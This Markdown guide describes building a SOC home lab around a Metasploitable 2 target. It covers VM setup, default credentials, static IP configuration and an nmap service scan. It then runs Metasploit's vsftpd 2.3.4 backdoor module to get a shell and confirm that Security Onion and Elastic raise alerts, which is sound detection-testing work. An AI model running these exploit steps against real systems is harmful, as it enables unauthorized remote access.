# Metasploitable 2 Setup Guide (Phase 1)

## Objective

Deploy Metasploitable 2 as a purposely vulnerable Linux target used to validate detection capability within the SOC lab.

This machine is used for exploitation testing and alert generation.

---

## VM Specifications

CPU: 1–2 cores  
RAM: 2 GB  
Disk: 20 GB  
Network Adapter: Internal (Lab Network)

---

## Step 1 – Import Metasploitable 2

1. Download Metasploitable 2 VM image
2. Import into UTM
3. Assign resources (2 GB RAM minimum)
4. Attach Internal Network adapter
5. Boot VM

Default Credentials:
```
username: msfadmin
password: msfadmin
```

---

## Step 2 – Configure Static IP Address

Edit interfaces file:

```
sudo nano /etc/network/interfaces
```

Add:

```
auto eth0
iface eth0 inet static
address 192.168.100.30
netmask 255.255.255.0
gateway 192.168.100.1
```

Restart networking:

```
sudo systemctl restart networking
```

Verify:

```
ip a
ping 192.168.100.10
```

---

## Step 3 – Confirm Running Services

From Kali, scan target:

```
nmap -sV 192.168.100.30
```

You should observe:

- FTP (vsftpd 2.3.4)
- SMB
- Telnet
- Apache
- MySQL

---

## Step 4 – Exploitation Validation (Example)

From Kali:

```
msfconsole
```

Search for known vulnerability:

```
search vsftpd
```

Use module:

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.100.30
run
```

Expected Result:
- Successful shell session
- Security Onion generates alert
- Logs indexed in Elastic

---

## Detection Validation

Confirm:

- Alert triggered in Security Onion
- Network traffic visible
- Sysmon logs lateral movement attempt (if applicable)
- Event searchable in Elastic

---

## Troubleshooting

No services detected:
- Confirm network adapter set to Internal
- Confirm static IP assigned
- Verify services running

No alert triggered:
- Confirm Security Onion monitoring correct network
- Confirm dual NIC setup
- Verify IDS rules enabled

---

## Skills Demonstrated

- Vulnerable system deployment
- Static IP configuration (Linux)
- Service enumeration
- Exploit validation
- Blue team detection verification
- SIEM alert analysis workflow
